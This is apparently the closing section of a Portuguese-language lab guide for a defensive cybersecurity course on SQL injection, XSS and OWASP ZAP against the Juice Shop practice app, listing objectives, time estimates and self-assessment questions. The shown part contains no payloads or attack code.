+- ✅ Entender o conceito de SQL Injection e XSS
+- ✅ Saber usar OWASP ZAP para interceptar tráfego
+- ✅ Mapear vulnerabilidades para OWASP Top 10
+- ✅ Documentar exploits e defesas
+- ✅ Desenvolver mindset "pensar como atacante"
+
+**Benchmark de Aprendizado:**
+- **Iniciante:** Explorou 2 vulnerabilidades, entende conceitos básicos
+- **Intermediário:** Explorou 4+ vulnerabilidades, criou payloads customizados
+- **Avançado:** Completou 5+ desafios do Juice Shop, automatizou explorações
+
+**Tempo Esperado:**
+- Setup: 5 minutos
+- SQL Injection: 10 minutos
+- XSS: 8 minutos
+- ZAP: 7 minutos
+- Reflexão OWASP Top 10: 5 minutos
+- **Total: ~35 minutos** (podendo estender com desafios)
+
+---
+
+## 🎓 REFLEXÃO FINAL
+
+### Perguntas para Auto-Avaliação
+
+1. **Você consegue explicar SQL Injection para alguém não-técnico?**
+   - Teste: Explique usando analogia do mundo real
+
+2. **Você pensaria diferente ao desenvolver código agora?**
+   - Antes: "Faz o código funcionar"
+   - Depois: "Faz o código funcionar DE FORMA SEGURA"
+
+3. **Qual vulnerabilidade te surpreendeu mais?**
+   - Por que? Qual o impacto?
+
+4. **Se você fosse o desenvolvedor do Juice Shop, o que mudaria primeiro?**
+   - Priorize por impacto × esforço
+
+5. **Você se sente confortável explicando OWASP Top 10 agora?**
+   - Teste: Escolha 3 categorias e explique com exemplos
+
+---
+
+**Próximo Passo:** Com a mentalidade de ataque desenvolvida, você está pronto para aprender a **CONSTRUIR DEFESAS** nos próximos módulos (Threat Modeling, SAST, DAST, etc.)!
+
+---
+
+**FIM DO LABORATÓRIO**
+
+Este material foi desenvolvido para o Módulo 1 - "Fundamentos e Mindset de Ataque" do curso de Pós-Graduação em Cibersegurança Defensiva.
+
+Professor: Fernando Silva - Engenheiro de Segurança de Aplicações
+
+⏱️ **Tempo Total:** 30 minutos (podendo estender com desafios extras)
